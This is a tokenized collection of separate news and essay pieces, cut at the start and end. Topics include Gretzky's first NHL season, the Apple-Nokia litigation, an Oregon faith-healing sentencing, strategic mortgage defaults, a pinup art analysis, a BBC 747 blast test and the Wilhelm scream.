The Coliseum exploded as the Great One became ( and remains ) the youngest to ever hit 50 .
Washington was stumbling , so the Oilers could and did wrap up their playoff berth with a convincing home win over Colorado in their 80th and last game of the season .
The Oilers , 20 - 37 - 12 at the deadline , had finished the season on an 8 - 2 - 1 roll and passed the Capitals by two points .
Gretzky scored three points to finish the game two up on Dionne , but could only watch helplessly as the Little Beaver scored a pair of assists in his own season finale to tie up the scoring race at 137 points apiece .
Gretzky had played one fewer game , but the tie - breaker was most goals , meaning Dionne by 53 - 51 .
The disappointed Gretzky kept his composure and showed his class , delivering only the famous line " my dad always taught me that an assist is as good as a goal " .
He missed out on the Calder Trophy , also controversially , as he and other WHA " veterans " were excluded from rookie status .
But the voters were not to be denied , and Gretzky wound up with the biggest individual bauble of all , the Hart Trophy , along with the Lady Byng .
And a berth in the playoffs .
As the 16th place team in a fully interlocking schedule , the Oilers were in over their heads in drawing the first - overall Philadelphia Flyers .
That was the squad that ran off the still - extant NHL record 35 - game undefeated streak under rookie head coach Pat Quinn .
( 30 years later that same Pat Quinn , now coach of the Oilers and ex- of the Leafs , returns to Toronto as something of a conquering hero in his own right .
See , even ancient history has relevance of some sort ! )
Back then Quinn's Flyers would roll over the Oilers in three straight preliminary round games , although the blue and orange forced two of those games to overtime and gained some very valuable playoff experience along the way .
Low was outstanding in defeat ; he had provided just the sort of gritty netminding and leadership Glen Sather had been counting on .
Despite the disappointment of the loss and the unfinished business it represented , it had been a thrilling and wholly - satisfying first NHL season .
With all the attention focused on Apple suing HTC in the last few days , you might have forgotten that Apple has been embroiled in another legal dispute , instituted by rival mobile phone maker Nokia .
But if you ’ve been waiting to see those two companies duke it out in court , you ’ll have to wait a little longer : the Associated Press reported on Thursday that a federal judge has suspended the case .
The judge stayed litigation in the case pending the outcome of the International Trade Commission investigations that each company requested against the other .
The investigation into Apple was announced by the ITC in late January , while the responding investigation into Nokia was launched late last month .
After Nokia 's first lawsuit , launched in October of last year , Apple filed a counterclaim in the Delaware district court , also accusing Nokia of patent infringement .
Nokia subsequently launched a second suit , aiming to block importation of Apple hardware into the U.S .
The U.S. district court in Delaware is the site of Apple and HTC ’s court dispute as well .
However , since Apple has also filed a complaint with the ITC over that matter , it remains to be seen whether the HTC court case will meet a similar fate to the Nokia dispute .

Previous stories about faith healing in Oregon .
OREGON CITY -- Clackamas County Circuit Court Judge Steven Maurer sentenced Jeffrey and Marci Beagley to 16 months in prison this afternoon , calling the couple ’s decision to not seek medical care for their 16 - year - old son , Neil Beagley , a “ crime that was a product of an unwillingness to respect the boundaries of freedom of religious expression . ”
Marci Beagley sobbed as the sentencing was read , and shortly after , defense attorney Wayne Mackeson objected to the prison time .
The sentence also includes three years of post - prison supervision .
Jeffrey and Marci Beagley were found guilty of criminally negligent homicide after a two - week trial that focused on the death of 16 - year - old Neil Beagley , who died in June 2008 of complications involved with a urinary tract obstruction .
The couple belong to the Followers of Christ Church , whose members have a lengthy history of child deaths from lack of medical care .
The deaths influenced a 1999 law eliminating the religious freedom defense in some cases involving the welfare of a child .
“ The idea of sending Jeffrey and Marci Beagley to prison is heart - wrenching , ” Maurer said in a lengthy explanation of his sentence .
“ I think , certainly , that I ’m in complete agreement with the jurors who observed that the Beagleys are good people . ”
But Maurer said too many children had died unnecessarily because of the church 's beliefs : " It needs to stop . "
He touched upon religious freedom , saying he thought the community was very respectful to beliefs from congregations like the Followers of Christ Church , which believes in faith - healing at the exclusion of most medical care .
But that freedom comes with boundaries when it comes to children , he said .
“ It is up to us as a community and a criminal justice system , and government , to take very seriously that societal obligation … and recognize that investment and interest we have in each and every child , ” he said .
The sentence could be a “ pause for reflection ” or re-examination for the Followers of Christ church , according to Maurer , who added that he believed the church was capable of “ softening the rigidity ” of their beliefs on excluding medical care .
The courtroom was packed with Beagley supporters , including their daughter Raylene Worthington and her husband Carl Brent Worthington .
Both were tried in July 2009 for second - degree manslaughter and criminal mistreatment in the death of their daughter , Ava Worthington .
Carl Brent Worthington was found guilty of criminal mistreatment , while the two were acquitted of all other charges .
Maurer repeated something he stated during the Worthington sentencing , which was also echoed by defense attorneys during the Beagley trial : the case was not a referendum on the church .
Yet ignoring the church ’s impact on the couple would be self - deluding , he said .
“ The church is imprinted upon them . "
Before Maurer ’s sentencing , prosecutor Greg Horner urged the court to impose the presumptive sentence of 16 to 18 months .
“ Only a penitentiary sentence reflects the seriousness of this crime , ” Horner argued .
It was necessary to consider the notion of deterrence in the case , Horner said , referring to the close - knit church community that closely followed the Beagley and Worthington trials .
“ The court has the opportunity to deliver a clear message that this idea that one can let a child die while they ’re praying without medical attention is not supportable , ” Horner said .
“ It must be addressed . ”
Horner spoke generally about similar cases involving citizens who had no criminal intent and no criminal record – those cases included sentences of up to 16 to 18 months , he said , and this case should be treated the same way .
Allowing Neil to die was “ outrageous , ” Horner said .
“ That lifetime of loving was erased by the days and weeks and months in the failure to provide the very basics of what a parent is required to do , ” he said .
Defense attorneys were adamant in recommending probation without prison time , noting that neither defendant had a criminal record .
“ Prison would be more destructive than productive , ” said defense attorney Steve Lindsey , who represents Marci Beagley .
Jeffrey Beagley 's attorney Wayne Mackeson spoke of an inseparable family and asked the judge to note that Neil Beagley ’s death was seen in the shadow of the death of Ava Worthington , who died a few months before Neil .
He also said Neil Beagley ’s faith was an integral part of the teenager ’s life .
Neil ’s level of maturity , age and his religious beliefs should be considered by the court , Mackeson said .
The Beagleys ' situation was a “ unique case ” with “ unique defendants , ” according to Mackeson .
Lindsey cited other faith - healing cases that resulted in probation , including one from Minnesota , in which a young girl died of diabetes , and one from Oregon , in which a boy died of leukemia .
He also offered his case for a probationary sentence earlier in the hearing , when he called Courtney Campbell , a philosophy professor who focuses in biomedical ethics at Oregon State University , as a witness on behalf of Marci Beagley .
Campbell recommended probation coupled with education and counseling from the medical community , saying that using “ persuasive measures ” is ethically preferable to legal sanctions such as prison .
“ Probation accompanied by education serves the needs for holding the person accountable for their actions and can prevent similar actions from being carried out in the future , ” he said , adding that it can provide for the social welfare of society .
Prosecutor Greg Horner hammered Campbell for not knowing all the specifics of the case , and asked if he and his colleagues recommended education and collaboration with the medical community before a death of the child .
“ Ideally , yes , ” Campbell said .
Horner also asked Campbell if he thought the Beagleys should be treated differently than other people who had been convicted of criminally negligent homicide and had been sentenced to the 16 to 18 months of jail .
“ I think there are different mechanisms in which you can discharge legal responsibility ” and personal accountability , Campbell answered .

Wynn Bloch has always dutifully paid her bills and socked away money for retirement .
But in December she defaulted on the mortgage on her Palm Desert home , even though she could afford the payments .
Bloch paid $ 385,000 for the two - bedroom in 2006 , when prices were still surging .
Comparable homes are now selling in the low - $ 200,000s .
At 66 , the retired psychologist doubted she ’d see her investment rebound in her lifetime .
Plus , she said she was duped into an expensive loan .
The way she sees it , big banks that helped fuel the mess all got bailouts while small fry like her are left holding the bag .
No more .
“ There was not a chance that house was ever going to be worth anywhere near what my mortgage was , ” said Bloch , who is now renting a few miles away after defaulting on the $ 310,000 loan .
“ I have n’t cheated or stolen . ”
Time was when Americans would do almost anything to hang on to their homes .
But that commitment appears to be fraying as more people fall behind on their loans while watching the banks and lenders that helped trigger the financial crisis return to prosperity .
Nearly one - quarter of U.S. mortgages , or about 11 million loans , are “ underwater , ” i.e. the houses are worth less than the balance of their loans .
While home values are regaining ground -- median prices rose 10 % in Southern California last month to $ 275,000 compared with a year earlier -- they remain far below the July 2007 peak of $ 505,000 .
Many homeowners are just coming to grips with the idea that prices will take years to reach the pre-crash peak : as long as 14 years in California , according to economist Chris Thornberg .
Stuck with properties whose negative equity wo n’t recover for years , and feeling betrayed by financial institutions that bankrolled the frenzy , some homeowners are concluding it ’s smarter to walk away than to stick it out .
“ There is a growing sense of anger , a growing recognition that there is a double standard if it ’s OK for financial institutions to look after themselves but not OK for homeowners , ” said Brent T. White , a law professor at the University of Arizona who wrote a paper on the subject .
Just how many are walking away is n’t clear .
But some researchers are convinced that the numbers are growing .
So - called strategic defaults accounted for about 35 % of defaults by U.S. homeowners in December 2009 , up from 23 % in March of 2009 , according to Luigi Zingales , a professor at the University of Chicago ’s Booth School of Business .
He and colleagues at Northwestern University ’s Kellogg School of Management reached that conclusion by surveying homeowners about their attitudes and experiences with loan defaults .
They found that borrowers were more willing to walk away if someone they knew had done it , and that the greater a homeowner ’s negative equity the more likely he or she was to default , even if the monthly payment was affordable .
An analysis released last year by credit bureau Experian and consulting firm Oliver Wyman estimated that nearly 1 in 5 homeowners who were seriously delinquent on their mortgages in the last three months of 2008 were walkaways .
“ The fact that people are strategically defaulting -- there is no question , ” Zingales said .
“ The risk that the number of people doing this might explode is significant . ”
A flood of walkaways could damage the nation ’s fledgling housing recovery by swamping the market with foreclosed properties .
Still , some experts are dubious that millions of underwater homeowners will pull the plug as Bloch did .
Homeownership remains the cornerstone of the American dream .
Moving is a hassle .
And the stigma associated with a foreclosure is likely to keep many hanging on for a recovery .
The biggest surprise is that so many underwater homeowners continue to pay , said White , the Arizona law professor .
He ’s convinced that personal shame , as well as moral suasion by the government and financial institutions , has kept many homeowners from walking away , even when they ’d be better off financially by dumping their homes .
But real estate veterans said old taboos were eroding fast .
Jon Maddux , a former real estate investor who in 2007 founded You Walk Away , a for - profit company that guides homeowners through the process of default , said his earliest customers struggled with emotional ties to their homes as well as remorse about reneging on an obligation .
That ’s changed as more homeowners have concluded that the housing market is n’t going to rebound quickly and they ’d be better off cutting their losses .
“ Now , it ’s more of a business decision -- it ’s people who could afford their house but it ’s an inconvenience , ” Maddux said .
He and other experts said average Americans are fed up with hearing how they ’re supposed to honor their debts while businesses operate by another set of rules .
Case in point : Maguire Properties Inc. , one of the largest commercial landlords in California , walked away from seven prime office buildings in Los Angeles and Orange counties last year , defaulting on loans worth more than $ 1 billion .
Consumers typically begin to think about walking away once the value of the property has fallen to 25 % less than the value of the debt , according to research conducted by Sam Khater , senior economist at real estate research firm First American CoreLogic .
About 5 million people nationwide are in that situation , he said .
Some purchased their homes at the peak of the market only to see the value drop precipitously when the bubble burst .
Others bought low but could n’t resist borrowing against their rising equity to make home improvements and pay off other bills .
When home values fell , they too found themselves underwater .
Ken Henrich purchased his Marysville , Calif. , home for $ 187,000 in 2004 .
He and his wife later refinanced the property , tapping their increased equity to pay off credit cards .
They now owe around $ 300,000 on a place that ’s worth about $ 132,000 .
They let the four - bedroom residence slip into foreclosure and are waiting for it to be sold at auction .
They ’re planning on renting for a few years until they can perhaps buy again .
“ We can more than make the payment , ” the 54 - year - old sales rep said .
“ The way we look at it , our credit would still be perfect years from now but we ’d still owe tons more than it ’s worth . ”
There are consequences to walking away .
A default will knock down a credit score by at least 100 points , said Craig Watts , a spokesman for FICO , the company that developed credit scores .
That could make it tough to borrow money , rent an apartment or get a job because many employers now routinely check the credit histories of potential hires .
To some homeowners those consequences are a small price to pay to gain a measure of revenge against the financial institutions whose loose money helped fuel the crisis .
Joseph Shull , a 68 - year - old marketing professor , said he ’s planning to walk away from the town house he bought in Moorpark in June 2006 .
“ I ’m angry , and there are a lot of people like me who are angry , ” he said .
He purchased the home for $ 410,000 and spent $ 30,000 renovating .
Now the house is worth around $ 225,000 .
Shull admits he overpaid for his property .
But he said it fell in value in part because of “ regulatory mismanagement . ”
“ The bank stabbed me , but at least I got in a pinprick back , ” he said .
“ This is the new economy .
The old rules do n’t apply any more . ”

# 30 : The Steampunk Harem by Aly Fell
The Steampunk Harem , by Aly Fell , copyright 2009 .
This analysis copyright 2010 by Scott M. McDaniel .
The Image
The website ConceptArt.org has , among other things , an activity called “ Character of the Week . ”
In November of 2009 , one of the topics was “ Steampunk Harem . ”
Participants have one week to produce a painting from scratch that satisfies the brief , which for this one was :
They are pampered and preened for the Sultan and Sultana .
Doused with pungent oils , washed with lavender and cinnamon scented perfumes , their skins perfect and their complexions refined and painted to reflect the whim of their master and mistress .
They are treated with respect and adoring attention , but they are prisoners ; birds in a gilded - cage .
They are the concubines of the king and queen , the harem slaves of oriental fantasy .
But the world these particular chattels inhabit is a Steampunk world .
This week design a Steampunk harem boy or girl .
Either gender , it ’s up to you ; and environment is also at your own discretion .
This harem is fantasy , and we suggest looking at odalisques and Victorian Orientalist painting as inspiration , but keep in mind their costume and world they inhabit is Steampunk .
I ’m familiar with Aly Fell ( aka Poshspice ) from his long - time participation in the Character of the Week activities , and he is one of the current moderators .
This is the painting he did for the activity , and in addition to capturing the brief I think it ’s a fine example of the classic pinup .
For this analysis , I ’ll look at several things , including what makes something a pinup , composition and rhythm , and the role of details in creating a finished piece .
Composition and Rhythm
OK , here ’s a smaller version of the picture with a lot of stuff packed into it :
Stage 1 : Blank Grey .
We ’re about to look at how Fell uses the silhouette and frames the figure with it .
So , next up is …
Stage 2 : The dark frame .
The curtains are dark and they create a frame in which Fell will put his figure .
Even at this stage look at how our eyes are drawn to the contrast and basic foreground shape created by the frame .
Stage 3 : The light frame .
When is the last time you saw a waning gibous moon in an illustration ?
Circles are a classic framing device to draw our attention to something .
Here it ’s not a moon , of course , but rather a bright porthole window framing a beautiful woman .
A bright circle is a simple , pleasing shape .
It also gives Fell a way to create some high contrast and bring our attention to the figure inside .
Stage 4 : The silhouette .
So the figure now has our attention what with all that framing .
From just the silhouette we can easily tell that it ’s a woman and see that she is sitting / leaning .
The arms are little more ambiguous .
One of them does n’t appear in the silhouette at all , and the other is partially obscured by the curtain .
Overall , though , we ’ve clearly identified the woman her posture , and even her basic attitude .
Stage 5 : Alternating Value .
Like Howard Pyle ,
Fell sets up a rhythm of light and dark that alternates between each .
At a large scale you do n’t see something dark next to something even darker .
Stage 6 : Alternating Values Part 2 .
This is to let you see that alternating pattern in the actual picture .
Something else to notice is the simplicity of the overall layout and composition .
It recalls J.C. Leyendecker ’s Couple Descending a Staircase .
The basic layout is a sweeping curve moving downward and to the left .
Aside from the woman ’s pose , the shapes of the curtains and bed also move us that way .
Before our eye leaves the painting , however , we end up going back up the woman ’s leg .
Her shoe comes a little close to edge of the painting for my taste , but does n’t touch it .
Let ’s take a look at the values too .
Here is the picture with saturation dropped to zero .
Even the framing window is not actually that bright .
The brightest parts are the highlights on her goggles and other machinery .
Aside from adding depth , putting the highlights there and , for example , on the gear mid-thigh brings our attention to the steampunk nature of the setting .
The brightest spot I found had a brightness of 94 % ( on her goggles ) .
The sky behind her , though , is around 65 - 70 % .
Now that we ’ve looked at values , try looking back up at the main version and looking at where Fell put his most saturated colors .
The Pinup Formula
Here ’s my developing theory of what makes a good pinup .
( At some point I ’ll do one of these for Alberto Vargas and revise it further . )
Simple , graphical composition .
The curtains above form a basic arc in this picture , and then the window puts a nice clean circle around the woman ’s head .
Pinups are n’t the place to get creative with compositions – keep it simple .
Clear silhouette .
We ’ve got to be able to easily read the picture and separate figure ( the person ) from background .
Silhouette is critical to that , and we should be able to tell the person ’s shape , posture , and attitude just from the silhouette .
Revealing Pose .
But not too revealing .
We should clearly see the shape of legs , hips , chest , or back .
We ’re not talking about what I ’ve seen figure photographers refer to as an “ open leg pose ” – we ’re not giving away the store .
The level of clothing varies , but it will always show off the figure .
Self - conscious Pose .
In this picture the woman is n’t looking at us , but in many pinup paintings she is .
Regardless , the person is aware of being watched on some level and is giving us an exaggerated posture that shows off the physique .
Sometimes the model breaks the fourth wall and flirts with us directly .
Other times , like in The Steampunk Harem , we see a melodramatic pose of the damsel in distress .
Certain Type of Physique .
For pinups of women , we usually see a person who is voluptuous and curvy .
She ’s at least moderately endowed and in her 20’s or 30’s .
Makeup will be obviously present ( red lips , mascara ) .
( Whether or not that ’s what the artist finds sexy is irrelevant in a way . )
Hair will usually be styled and between shoulder and back length .
That ’s certainly what we ’ve got in this painting .
See the Mucha analysis for another example .
I ’m sure there is a similar formula for men .
The Details
I mentioned how pinups should be simple .
Sometimes there is only the barest suggestion of a background , like Vargas ’ cover to the Cars album Candy - O. Steampunk , on the other hand , calls for gears and machinery and intricate patterns .
Fell had to keep things simple but still provide enough of the fine detail that we ’d see the steampunk in the situation .
His composition is simple and pure pinup .
To keep from overwhelming the picture , he chose to put just about all of the steampunk details on the figure with the exception of the gears on the floor tiles .
The style of the porthole and the fact that we ’re in an airship also feeds the steampunk atmosphere .
Other details come from the orientalist painting tradition , like the trim along the bottom of the bed , the translucent curtains , and the hookah .
Here is an example of the detail we can see in the head and shoulders .
Compare the level of detail to the pillows and bed linen below .
( Am I the only one that finds the idea of a pierced upper arm just a bit unsettling ? )
When it comes right down to it , even the hair net , gears , collar , and hand - thing look more complicated than they are .
The simplicity in them fits the pinup idea .
Like all Character of the Week drawings ,
Fell only had a week do this , so only a certain level of detail is possible .
Even so , the glove appears intricate though it ’s composed of simple cylinders and circles .
The key is to pick the right details and let the viewer mentally fill in others .
Here are two more details that I ’ll toss out because I think they ’re cool .
The corset and hips are neat :
Finally , do n’t miss
Fell ’s signature in the lower right corner :
The Elements
To wrap up we ’ll go through Lee Moyer ’s Elements of a Successful Illustration .
Focus :
As with all pinups , there is only one focus and it ’s on the figure .
Composition and Design : Fell keeps the composition clean and simple , framing the figure with both light and dark shapes .
Palette : Warm reds and browns take up most of the picture .
The sky through the window gives a nice cool accent from the complementary blue .
Value :
Not as bright as I ’d first thought .
It ’s a dark to mid - tone painting for the most part , which bright highlights reserved for only a few key details .
Mass :
Fell gets a nice sense of volume through values , lighting , and shadow placement .
Texture : I like the textures we see on the floor and the pillows particularly .
They ’re subtle but help keep things from feeling too slick .
Symbolism : Consider the shape and placement of the hookah ?
Conscious ?
I do n’t know , but pinups generally are n’t known for subtlety .
Or maybe my mind ’s just in the gutter .
Micro / Macro :
Fell does a good job of giving us just the right details .
A moorish geometric pattern on the bedsheets may make logical sense but would just confuse our eyes .
Ornament :
It ’s steampunk .
Narrative : Pinups tend to be light on narrative , but that does n’t mean story is absent .
We see she is on an airship , and her pose and expression indicate Hollywood - style distress .
Juxtaposition :
The color and placement of the window contrast with the figure .
Stylization :
How often do you see a mix of pinup , orientalist painting , and steampunk ?
Character : Pinups are n’t about plumbing the depths of the soul .
They paint with broad strokes , so we get a broad impression of the woman ’s character based on posture and costume .
Tension :
Well , there ’s that distress I mentioned .
I somehow doubt she ’s about plunge to her doom .
A dark and mysterious sultan from high pulp tradition is likely in her future , though .
Line :
The clearest edges are around the woman and window .
The further we get from the focus the less defined the edges need to be .
Research / Reference : Since he posted the topic in the first place , I know that Fell looked for and pointed the participants to resources involving both steampunk and orientalist painting .
Vignette :
We see background but the silhouette is clear .
Perspective : Perspective is not a major part of the painting .
Most of the painting is midground , with only clouds and sky in the distance .
That ’s it for this ( belated ) analysis .
I ’m going to take this weekend off to deal with some other art related things that have come up and will be back the following weekend .

A test explosion on a Boeing 747 has shown that a US Christmas Day flight would have landed safely even if a bomb on board was detonated successfully .
The plane 's fuselage did not break in the controlled blast , which used the same explosives that were on Flight 253 from Amsterdam to Detroit .
However experts said it showed the suspected bomber and the passenger next to him would have been killed .
Umar Farouk Abdulmutallab , 23 , has denied attempting to murder 289 people .
The controlled experiment was carried out for the BBC Two documentary How safe are our Skies ?
Detroit Flight 253 .
It would have been quite horrific - obviously the blast itself would cause eardrum rupture
Dr John Wyatt , international terrorism and explosives expert Dr John Wyatt , an international terrorism and explosives adviser to the UN , replicated the conditions on board the Detroit flight on a decommissioned Boeing 747 at an aircraft graveyard in Gloucestershire , England .
The same amount of the explosive pentaerythritol ( or PETN ) allegedly carried by Mr Abdulmutallab was placed to mirror the location where he was sitting on the plane .
Captain J Joseph , an air accident investigator , and Dr Wyatt both concluded that the quantity of explosive used was nowhere near enough needed to rupture the skin of a passenger plane .
Dr Wyatt said : " If it was a more rigid material then we might have seen a crack or breakthrough but this is actually quite a flexible material .
" I was extremely impressed by the aircraft structure .
" It can sustain quite a hefty thump . "
Captain Joseph said : " We noticed the aircraft had lost some rivets but no flight controls were compromised and certainly no fuel tanks were breached .
" I 'm very confident that the flight crew could have taken this aeroplane without any incident at all and get it on the ground safely . "
Body parts
However , the experts said that the death of the suspected bomber and the passenger sitting next to him would have been traumatic for passengers .
After seeing ... how well the aircraft maintained its structural integrity , and obviously the pilot 's capacity to fly the aircraft , it should give them ( passengers ) a great deal of confidence
Captain J Joseph , air accident investigator " It would have been quite horrific .
Obviously the blast itself would cause eardrum rupture , " said Dr Wyatt .
Captain Joseph said the noise and the smoke would have been awful , " not to mention the parts of the bodies that were disintegrated as part of the explosion " .
But Captain Joseph said the experiment could help to put air travellers at ease : " I think this should be a confidence - builder for passengers .
" After seeing ... how well the aircraft maintained its structural integrity , and obviously the pilot 's capacity to fly the aircraft , it should give them a great deal of confidence . "
For security reasons , they could not go into specific details of blast damage inside the cabin of the test Boeing 747 .
Kip Hawley , the former head of the US Transportation Security Administration ( TSA ) said : " We can be sure that al Qaeda and others have taken lessons from their failed attempt and this program allows the public to be privy to some of those lessons .
" An active and engaged public can not only be a layer of security but can be more effective in demanding the kind of security that will work .
" The explosives analysis done by Dr John Wyatt gave a realistic picture of the effects of a carry - on bomb roughly similar to the one used on Christmas Day .
FLIGHT 253 Umar Farouk Abdulmutallab , a Nigerian , is accused of trying to blow up the plane with a device hidden in his underwear Officials say he planned to detonate it using a syringe filled with chemicals Instead he caused a fire and was overpowered by passengers
He faces life imprisonment if convicted Al - Qaeda in the Arabian Peninsula says it was responsible for the failed attack " The point that today 's airframes are more resilient than many imagine is a critical point .
" Governments do very sophisticated testing similar to what Dr Wyatt demonstrated and those results inform security measures you see in airports today .
" Specifically , it was that kind of testing that led to the decision to allow 100 ml of any liquid , carried in a sealed one - quart baggie , to be brought through security . "
Dr Wyatt 's test results are to be shared with governments and aviation security experts around the world .
How safe are our Skies ?
Detroit Flight 253 was broadcast on BBC Two on Thursday 4 March , at 2100 GMT .
Watch it again on BBC iplayer .
Some readers have questioned the validity of the experiment given that the plane was tested on the ground .
The programme - makers gave this response :
At the time of the attempted detonation , Flight 253 was descending rapidly and its altitude has been estimated to be around 10,000 ft .
At that height the difference in pressure inside and outside the plane would not have been great enough significantly to affect the explosion .
So the explosion team ruled that the decommissioned plane 's lack of doors was not a factor in the test .
With this quantity of explosive , the peak pressure and impulse are over quickly and decay rapidly over distance .
The doors were sufficiently far away that the overpressure would have dissipated before it reached them .

Hollywood Lost and Found
The WILHELM Scream
One sound effect that has found a following with many sound editors and observant movie fans is a distinctive scream named Wilhelm .
In 1951 , the Warner Bros. film " Distant Drums " directed by Raoul Walsh starred Gary Cooper as Captain Quincy Wyatt , who leads a group of soldiers to stop some Seminole Indians from threatening settlers in early 19th Century Florida .
During a scene in which the soldiers are wading through a swamp in the everglades , one of them is bitten and dragged underwater by an alligator .
As is usually the case with the making of a movie , the scream for that character was recorded later .
Six short pained screams were recorded in a single take , which was slated " man getting bit by an alligator , and he screams . "
The fifth scream was used for the soldier - but the 4th , 5th , and 6th screams recorded in the session were also used earlier in the film when three Indians are shot , one after another , during a raid on a fort .
After " Distant Drums , " the recording was archived into the studio's sound effects library , and was re-used in many Warner Bros. productions .
In " The Charge at Feather River " ( 1953 ) , the scream is heard when a soldier named Pvt. Wilhelm ( played by Ralph Brooke ) gets shot in the leg by an arrow .
Originally released in 3 - D , the film used the " Distant Drums " scream recording two other times as well .
Up until the mid-70's , the scream recording was used exclusively in Warner Bros.
productions , including " Them ! " ( 1954 ) , " Land of the Pharaohs " ( 1955 ) , " The Sea Chase " ( 1955 ) , " Sergeant Rutledge " ( 1960 ) , " PT - 109 " ( 1963 ) and " The Green Berets ( 1968 ) .
In " A Star is Born " ( 1954 ) , the scream is heard twice - one of the times because a scene with the scream in " Charge at Feather River " is playing in a screening room .
One person who noticed the same distinctive scream reoccurring in so many movies was sound effects fan Ben Burtt .
Ben and his friends in the cinema department at USC , Rick Mitchell and Richard Anderson , noticed that a scream was popping up in a lot of movies .
One of the films they made together , a swashbuckler parody " The Scarlet Blade " ( 1974 ) included the scream - which they borrowed off another film 's audio track .
A few years later , when Ben Burtt was hired to create sound effects for Star Wars ( 1977 ) , he had an opportunity to do research at the sound departments of several movie studios .
While at Warner Bros. looking for sound elements to use in the space adventure , he found the original " Distant Drums " scream - which he called " Wilhelm " after the character that let out the scream in " Charge at Feather River . "
Ben adopted the scream as a kind of personal sound signature , and included it in all the " Star Wars " and " Indiana Jones " films , and many of the other films he has worked on including " More American Graffiti " ( 1979 ) and " Willow " ( 1988 ) .
Ben 's friend Richard Anderson also continued the tradition .
Both Anderson and Burtt worked on " Raiders of the Lost Ark " ( 1981 ) , and Richard used the screams in the film 's truck chase - one of the sequences he cut sounds for himself .
Richard also used it in many of the films he supervised sound editing for , including " Poltergeist " ( 1982 ) , " Batman Returns " ( 1992 ) , " Planet of the Apes " ( 2001 ) , " Agent Cody Banks " ( 2003 ) , and " Madagascar " ( 2005 ) .
Because of Ben Burtt , the Wilhelm has lived in the sound library at Skywalker Sound .
Other colleagues there including Gary Rydstrom and Chris Boyes have used it in such films as " Toy Story " ( 1995 ) , " Hercules " ( 1997 ) and " Pirates of the Caribbean " ( 2003 ) .
Richard Anderson and his company , Weddington Productions ( now a part of Technicolor Sound Services ) , archived the scream into his library as well .
Editors there including Mark Mangini , David Whittaker , Steve Lee and George Simpson have used it in " Beauty and the Beast " ( 1991 ) , " Aladdin " ( 1992 ) , " A Goofy Movie " ( 1995 ) , " The Fifth Element " ( 1997 ) ,  The Majestic ( 2001 ) ,  Just Visiting  ( 2001 ) ,  A Man Apart ( 2003 ) , and " Tears of the Sun " ( 2003 ) .
Growing in familiarity with fellow sound editors , especially with its use in the hugely successful " Star Wars " series , the Wilhelm Scream has become a favorite with a few sound editors outside of Skywalker and Weddington .
Although it has never been available in any commercial sound effects library , the recording has made it around the sound community through editors who appreciate its history .
Only a few studios have the master of the Wilhelm , but because the " classic " scream can be found " in the clear " in a few films - such as the Judy Garland version of " A Star as Born , " it has been " borrowed " for projects this way by other studios not to mention quite a few student films .
Some noted Directors have become fans of the Wilhelm and its history , asking for it by name .
Joe Dante is familiar with the scream .
Beginning with his first major film , " Hollywood Boulevard " ( 1976 ) , it has been included in his films " Explorers " ( 1985 ) , " Gremlins 2 " ( 1990 ) , " The Second Civil War " ( 1997 ) ,  Matinee ( 1993 ) , and " Looney Tunes : Back in Action " ( 2003 ) .
After learning the significance of the scream while it was being put into " Reservoir Dogs " ( 1992 ) , Quentin Tarantino called a break from its mix so that he and his sound crew could crowd into a nearby room with a small TV to watch " Distant Drums " on a local station to hear the scream .
Later Wilhelm appeared in his film " Kill Bill : Vol. 1 " ( 2003 ) as well .
When Peter Jackson was told the history of the Wilhelm during the sound mix of " The Lord of the Rings : The Two Towers " ( 2002 ) , he was so excited it was included that he had its volume raised - and insisted that it also be used in " Return of the King " ( 2003 ) .
Wilhelm occasionally pops up on television shows .
Besides its use in a number of shows produced at Warner Bros. in the '50s and ' 60s , including " Maverick , " it was in episodes of " The X - Files , " " Angel , " and " Family Guy . "
It has found its way into a few commercials as well - for Dell Computers and Comcast .
Several theme park attractions included the scream , such as The Star Trek Adventure at Universal Studios , The Batman Adventure at Warner Bros .
Movie World , and " Golden Dreams " playing at Disney 's California Adventure .
Video game fans have encountered the Wilhelm in many Star Wars games .
Although the " signature " or " classic " screams , takes 4 through 6 on the original recording , are the most recognizable , all of the screams are referred to as " Wilhelm " by those in the sound community .
The first scream can be heard in " The Empire Strikes Back " ( 1980 ) during the Hoth battle when a rebel soldiers laser gun dish is hit and explodes , and also during the truck chase in " Raiders of the Lost Ark " when a Nazi soldier falls from the rear left side of the truck , ripping the canvas as he falls .
The second take can be heard in Tim Burton 's " Planet of the Apes " ( 2001 ) when General Thade ( Tim Roth ) hurls two humans into the air at once .
The third scream is heard in the original " Star Wars " just before the stormtrooper falls into the chasm on the Death Star - and just before the " classic " Wilhelm is heard .
It is also in " Star Wars Episode II : Attack of the Clones " ( 2002 ) when a ship explodes on the planet Coruscant at the beginning of the film .
Many fans of the Wilhelm Scream have long wondered who originally performed the scream .
No specific documentation has been found attributing the scream to any one person , but Ben Burtt has been researching the matter .
Between his work on the last " Star Wars " films , he has visited Warner Bros. to gather more information .
He discovered a file for " Distant Drums , " which contained paperwork that was left over from the picture editor when the film was completed .
One of the papers was a short list of names of actors who were scheduled to come in to perform various lines of dialogue for miscellaneous roles in the movie .
After reviewing the names and even listening to their voices , one person seemed to be the most likely suspect .
Sheb Wooley was a musician and character actor who appeared in many Westerns - but is probably most famous for the song " Purple People Eater , " which in 1958 spent six weeks at Number One and sold 3 million copies .
He played one of the four gunslingers that stalked Gary Cooper in the classic " High Noon " ( 1953 ) , and starred on the hit TV series " Rawhide " as scout Pete Nolan .
He also appeared in " Giant " ( 1956 ) , " The Outlaw Josey Wales " ( 1976 ) , " Silverado " ( 1985 ) and even the film adaptation of his song " Purple People Eater " ( 1988 ) .
Sheb played the uncredited role of Private Jessup in " Distant Drums , " and was one of the few actors assembled for the recording of additional vocal elements for the film .
It is very likely he was asked on the spot to perform other things for the film , including the screams for a man being bitten by an alligator .
Sheb Wooley died of leukemia in Nashville , Tennessee , in 2003 .
He was 82 .
Although there is no way to confirm with him that he performed these special screams , his wife , Linda Dotson - Wooley , said Sheb was fond of saying how talented he was at performing laughs , screams , and dying vocals for films .
After finishing the last " Star Wars " film and beginning work at Pixar , Ben Burtt has announced he will no longer be using the Wilhelm .
This is surely an end of an era for the scream , but there is no indication that it will be silenced anytime soon .
The Wilhelm Scream continues to be heard in new films every year .

The Algerian Nuclear Problem , 1991 : Controversy over the Es Salam Nuclear Reactor
1991 Controversy over Algerian Nuclear Reactor Led Washington to Seek Chinese Assistance in Pressing Algiers to Adhere to Nuclear Nonproliferation Goal
National Security Archive
Electronic Briefing Book No. 228
Edited by William Burr
Posted - September 10 , 2007
Washington DC , September 10 , 2007 -
